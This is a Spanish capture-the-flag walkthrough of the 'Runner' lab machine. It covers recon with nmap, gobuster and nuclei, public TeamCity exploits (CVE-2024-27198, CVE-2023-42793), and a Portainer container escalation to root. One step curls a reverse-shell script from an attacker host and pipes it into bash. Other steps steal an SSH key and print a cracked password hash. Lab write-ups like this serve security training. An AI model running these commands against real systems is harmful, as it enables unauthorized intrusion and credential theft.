<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Runner</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Runner</h1><br/><p><ol><li>realizo un escaneo de puertos  <strong>nmap 10.10.11.13 -Pn -sC -sV -p- --open --stats-every=5s -oA scan</strong></li><li>Encuentro los servicios: 22 → ssh → OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 80 → http → nginx 1.18.0 (Ubuntu) 8000 → nagios-nsca → Nagios NSCA → Open Source IT system monitoring tool.</li><li>Entro en la página web</li><li>Nos da error al encontrar el server</li><li>Lo añadimos a /etc/hosts</li><li>Para ver las tecnologías que usa hago un <strong>whatweb</strong> de la página <strong>whatweb </strong><strong><a href="http://runner.htb/">http://runner.htb/</a></strong><strong>    </strong>      </li><li>Hago un Directory Bruteforce attack para buscar algún login o algún directorio para obtener una reverse<strong> gobuster dir -u </strong><strong><a href="http://runner.htb/">http://runner.htb/</a></strong><strong> -w /usr/share/wordlists/dirb/big.txt</strong> </li></ol><img src="images/40-1.png" alt="images/40-1.png" /><ol><li>encuentro  /assets</li><li>hago un ffuf para buscar otras rutas pero no encuentro nada <strong>ffuf -u </strong><strong><a href="http://runner.htb/">http://runner.htb/</a></strong><strong> -H &quot;Host: FUZZ.runner.htb&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 3058</strong></li><li>Pruebo a hacerlo con gobuster a ver si encuentro algún vhost interesante</li></ol></p><p> <strong> gobuster vhost --append-domain -u </strong><strong><a href="http://runner.htb/">http://runner.htb/</a></strong><strong> -w /usr/share/seclists/Discovery/DNS/namelist.txt --random-agent -t 600</strong><ol><li>Encuentro un conjunto de vhosts pero hay uno interesante que tiene un login </li></ol><img src="images/40-2.png" alt="images/40-2.png" /><ol><li>Lo añado a /etc/hosts</li><li>Entro en la dirección y me manda a un login </li></ol><img src="images/40-3.png" alt="images/40-3.png" /><ol><li>Tras buscar encuentro que TeamCity es un servidor de gestión de compilación e integración continua de JetBrains (Debajo del login está la versión)</li><li>Para buscar vulnerabilidades para este login usaré la herramienta nuclei <strong>nuclei -tags teamcity -u teamcity.runner.htb</strong></li><li>Nos encuentra un CVE </li></ol><img src="images/40-4.png" alt="images/40-4.png" /><ol><li>Encuentro una vulnerabilidad que permite bypassear usando una ruta alternativa vulnerable <a href="https://github.com/yoryio/CVE-2024-27198">https://github.com/yoryio/CVE-2024-27198</a></li><li>Ejecuto el exploit  <strong>python3 CVE-2024-27198.py -t </strong><strong><a href="http://teamcity.runner.htb/login.html">http://teamcity.runner.htb/login.html</a></strong><strong> -u sergux -p sergux2</strong></li><li>Consigo acceso al dashboard como administrador </li></ol><img src="images/40-5.png" alt="images/40-5.png" /><ol><li>Encuentro otros 2 usuarios </li></ol><a href="https://cdn.discordapp.com/attachments/1209613404222787666/1231764426890153984/image.png?ex=662a4d44&is=6628fbc4&hm=28bf0df6bb616c976257c689a4673ca806f968f4dcb0873e3ac08cffca9bbc15&"><img src="images/40-6.png" alt="images/40-6.png" /></a><ol><li>Ahora tengo que buscar algún sitio donde subir o injectar mi payload</li><li>Usando el script  <strong><a href="https://github.com/Zenmovie/CVE-2023-42793">https://github.com/Zenmovie/CVE-2023-42793</a></strong> Creo un usuario y puedo ejecutar comandos  </li></ol><img src="images/40-7.png" alt="images/40-7.png" /><ol><li>b<strong>bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 &quot;id&quot;</strong> </li></ol><img src="images/40-8.png" alt="images/40-8.png" /><ol><li>Ahora uso un reverse shell y activo nc para tener un RCE de forma algo más cómoda</li><li>En la script cambio el comando </li></ol><img src="images/40-9.png" alt="images/40-9.png" /><ol><li>Ejecuto el RCE y hago un curl de un reverse shell de bash y que lo ejecute en la consola bin bash CVE-2023-42793_rce.sh <a href="http://teamcity.runner.htb">http://teamcity.runner.htb</a> 80 &quot;curl%20<a href="http://10.10.14.6:8000/rev-shell2%7Cbash">http://&lt;IP&gt;:&lt;PORT&gt;/rev-shell2%7Cbash</a>&quot; </li></ol><img src="images/40-10.png" alt="images/40-10.png" /><ol><li>En esta ruta encuentro el id_rsa<strong> /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa </strong></li><li>Entro con ssh probando con los usuarios que encontré antes<strong> ssh john@runner.htb -i id_rsa</strong></li><li>Si me da error por permisos hago un <strong>chmod 600 id_rsa</strong> </li></ol><img src="images/40-11.png" alt="images/40-11.png" /><ol><li>Descargo y uso linpeas.sh para buscar un privesc</li><li>Encuentro un subdominio </li></ol><img src="images/40-12.png" alt="images/40-12.png" /><ol><li>Agrego el subdominio a<strong> /etc/hosts</strong></li><li>Encuentro un login </li></ol><img src="images/40-13.png" alt="images/40-13.png" /><ol><li>Tras mirar podemos hacer una backup de toda la DB. Obtengo el hash the todos los usuarios </li></ol><img src="images/40-14.png" alt="images/40-14.png" /><ol><li></li></ol><img src="images/40-15.png" alt="images/40-15.png" /><ol><li>Lo crackeo con hashcat<strong> hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt</strong></li><li>Encuentra la pass<strong> hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt --show</strong> $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123</li><li>Entro al dashboard de portainer.io con los credenciales de <strong>matthew:piper123</strong></li><li>Como no tengo mucha idea de que es portainer me informo</li><li>Portainer es una herramienta web open-source que permite gestionar contenedores Docker.​ Permite administrar contenedores de forma remota o local, la infraestructura de soporte y todos los aspectos de las implementaciones de Kubernetes</li><li>Tengo que crear un nuevo volumen como root y ejecutarlo dentro del docker </li></ol><img src="images/40-16.png" alt="images/40-16.png" /><ol><li>Contruyo el container usando la imagen de teamcity con el volumen root que acabo de crear </li></ol><img src="images/40-17.png" alt="images/40-17.png" /><ol><li>Activo la tty interactiva  </li></ol><img src="images/40-18.png" alt="images/40-18.png" /><ol><li>Y le asigno el volumen de root </li></ol><img src="images/40-19.png" alt="images/40-19.png" /><ol><li>Le doy a Deploy Container y nos aparece la lista de containers </li></ol><img src="images/40-20.png" alt="images/40-20.png" /><ol><li>Ponemos como usuario del container al root </li></ol><img src="images/40-21.png" alt="images/40-21.png" /><ol><li>Nos conectamos y encotramos la flag de root </li></ol><img src="images/40-22.png" alt="images/40-22.png" /></p><p align="center"></p></div>
</body>
</html>
